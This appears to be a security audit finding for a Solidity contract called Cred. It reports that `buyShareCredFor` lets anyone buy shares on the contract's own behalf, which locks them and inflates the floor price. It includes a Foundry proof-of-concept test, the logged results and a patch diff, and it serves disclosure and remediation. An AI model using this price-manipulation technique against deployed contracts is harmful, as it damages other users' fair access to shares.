# Vulnerability details

## Impact
`Cred:buyShareCredFor` allows a malicious user to buy shares on behalf of the Cred contract which in turn inflates the floor price of the shares in that specific cred, as these shares cannot be sold.

## Proof of Concept (POC)
The function `buyShareCredFor` checks for 0 address but not for the cred contract itself.

```solidity
    function buyShareCredFor(uint256 credId_, uint256 amount_, address curator_, uint256 maxPrice_) public payable {
        if (curator_ == address(0)) revert InvalidAddressZero();
        //@audit - missing check for address(this)
        _handleTrade(credId_, amount_, true, curator_, maxPrice_);
    }
```

Since the cred Contract cant call `sellShareCred` these shares are now locked which reduces the max supply of the shares in that cred and inflates the floor price of the Cred shares.

In the following scenario a malicious user buys half of the shares for the cred.

add the following test to `Cred.t.sol`:

```solidity
    function test_buyOnBehalfOfCred() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 credId = cred.credIdCounter() - 1;

        vm.startPrank(anyone);
        vm.deal(anyone, 10 ether);
        uint256 price = bondingCurve.getBuyPriceAfterFee(credId, 1, 450);
        console2.log("Price", price);
        cred.buyShareCredFor{value: price}(credId, 450, address(cred), price);
        vm.stopPrank();

        uint256 shareNumber = cred.getShareNumber(credId, address(cred));
        uint256 floorPrice =  bondingCurve.getBuyPriceAfterFee(credId, shareNumber, 1);
        console2.log("Floor Price", floorPrice);

        uint256 credShares = cred.getShareNumber(credId, address(cred));
        console2.log("Cred Shares", credShares);
    }
```

The output is as follows:

```
[PASS] test_buyOnBehalfOfCred() (gas: 756012)
Logs:
  Price 4404221811975910335
  Floor Price 25565149859248219
  Cred Shares 450
```

In this scenario the user has spent 4.4 eth to lock half of the shares, increasing the floor price to 0.02 ether.

in a more realistic scenario:

```
[PASS] test_buyOnBehalfOfCred() (gas: 756018)
Logs:
  Price 226268143560690834
  Floor Price 3560976393523667
  Cred Shares 100
```

the user has paid 0.22 ether to lock 100 shares to increase the floor price to 0.003 ether.

Although this may seem insignificant, due to the bonding curve being exponential towards the cap, having the cheapest shares locked away creates an unfair environment for users.

## Recommended Mitigation Steps

Add a check in the `buyShareCredFor` to prevent users from buying for the protocol.

```diff
    function buyShareCredFor(uint256 credId_, uint256 amount_, address curator_, uint256 maxPrice_) public payable {
        if (curator_ == address(0)) revert InvalidAddressZero();
+       if (curator_ == address(this)) revert *custom error as desired*;
        _handleTrade(credId_, amount_, true, curator_, maxPrice_);
    }
```
